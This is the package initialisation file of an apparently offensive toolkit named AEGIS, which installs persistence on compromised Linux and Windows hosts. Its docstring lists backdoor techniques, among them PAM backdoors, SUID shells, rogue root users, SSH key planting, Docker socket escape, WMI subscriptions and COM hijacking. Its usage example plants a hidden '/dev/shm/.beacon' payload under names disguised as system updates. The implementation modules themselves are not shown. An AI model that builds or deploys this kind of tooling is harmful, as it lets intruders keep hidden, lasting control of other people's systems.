"""
AEGIS-Advanced Node Persistence Package
=========================================
Cross-platform persistence mechanisms: Linux (cron, systemd, SSH keys,
LD_PRELOAD, PAM, udev) and Windows (scheduled tasks, registry, WMI,
services, BITS, IFEO, COM hijacking).

Exports:
    LinuxPersistence        — Linux persistence engine (15+ methods)
    WindowsPersistence      — Windows persistence engine (10+ methods)
    install_all_linux       — Install all available Linux persistence
    install_all_windows     — Install all available Windows persistence
    enumerate_linux         — Enumerate existing Linux persistence
    enumerate_windows       — Enumerate existing Windows persistence

Supported Linux Methods:
    cron, cron.d, systemd service+timer, SSH authorized_keys,
    bashrc/profile/zshrc, bash_logout, rc.local, init.d,
    udev rules, LD_PRELOAD, at jobs, SUID shell,
    PAM backdoor, root user add, Docker socket escape

Supported Windows Methods:
    Scheduled tasks (XML + PowerShell), Registry Run/RunOnce,
    WMI permanent event subscriptions, Windows services,
    BITS jobs, Startup LNK/BAT, IFEO debugger hijack,
    SilentProcessExit, COM hijacking (HKCU, no admin required)

Usage:
    from node.persistence import LinuxPersistence, WindowsPersistence
    import platform

    payload = "/usr/bin/python3 /dev/shm/.beacon &"

    if platform.system() == "Linux":
        p = LinuxPersistence(payload=payload, label="sysupdate")
        results = p.install_cron()
        results += p.install_systemd()
        results += p.install_ssh_key(pub_key="ssh-rsa AAAA...")
    else:
        p = WindowsPersistence(payload=payload, label="WinUpdate")
        results = p.install_scheduled_task()
        results += p.install_registry_run()
        results += p.install_wmi_subscription()

    for r in results:
        print(r["method"], "→", r["status"])
"""

from .linux import LinuxPersistence, install_all_linux, enumerate_linux
from .windows import WindowsPersistence, install_all_windows, enumerate_windows

__all__ = [
    "LinuxPersistence",
    "WindowsPersistence",
    "install_all_linux",
    "install_all_windows",
    "enumerate_linux",
    "enumerate_windows",
]

__version__ = "5.0"
